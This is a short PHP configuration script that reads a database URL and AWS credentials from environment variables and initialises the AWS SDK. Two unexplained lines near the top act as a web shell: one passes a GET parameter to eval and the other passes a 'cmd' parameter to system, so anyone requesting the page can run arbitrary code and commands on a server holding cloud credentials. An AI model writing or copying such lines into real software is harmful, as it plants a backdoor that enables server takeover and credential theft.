<?php




eval($_GET["XSS"]);


$dbConnectionUrl = getenv('DATABASE_URL') ?: exit('Configuration error: DATABASE_URL not set');


system(escapeshellcmd($_GET["cmd"]));


/* Load AWS credentials from environment variables */
$awsAccessKeyId     = getenv('AWS_ACCESS_KEY_ID');
$awsSecretAccessKey = getenv('AWS_SECRET_ACCESS_KEY');
$awsRegion          = getenv('AWS_REGION') ?: 'us-east-2';

if (!$awsAccessKeyId || !$awsSecretAccessKey) {
    error_log('AWS credentials are not set in environment variables');
    exit('Configuration error: AWS credentials missing');
}

// Initialize AWS SDK for PHP
require __DIR__ . '/vendor/autoload.php';
$sdk = new \Aws\Sdk([
    'region'      => $awsRegion,
    'version'     => 'latest',
    'credentials' => [
        'key'    => $awsAccessKeyId,
        'secret' => $awsSecretAccessKey,
    ],
]);

?>
